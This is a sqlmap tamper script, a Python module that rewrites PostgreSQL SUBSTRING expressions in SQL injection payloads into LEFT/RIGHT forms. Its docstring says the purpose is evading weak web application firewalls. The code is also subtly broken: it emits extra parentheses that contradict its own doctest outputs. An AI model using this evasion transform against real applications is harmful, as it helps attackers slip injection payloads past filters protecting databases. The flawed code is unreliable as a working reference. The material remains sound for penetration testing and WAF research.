#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT

    Tested against:
        * PostgreSQL 9.6.12

    Note:
        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)

    >>> tamper('SUBSTRING((X FROM 1 FOR 1))')
    'LEFT(X,1)'
    >>> tamper('SUBSTRING((X FROM 5 FOR 1))')
    'LEFT(RIGHT(X,-4),1)'
    """

    retVal = payload

    if payload:
        match = re.search(r"SUBSTRING\(\((.*)\sFROM\s(\d+)\sFOR\s1\)\)", payload)

        if match:
            pos = int(match.group(2))
            if pos == 1:
                _ = "LEFT((%s,1))" % (match.group(1))
            else:
                _ = "LEFT(RIGHT((%s,%d),1))" % (match.group(1), 1-pos)

            retVal = retVal.replace(match.group(0), _)

    return retVal
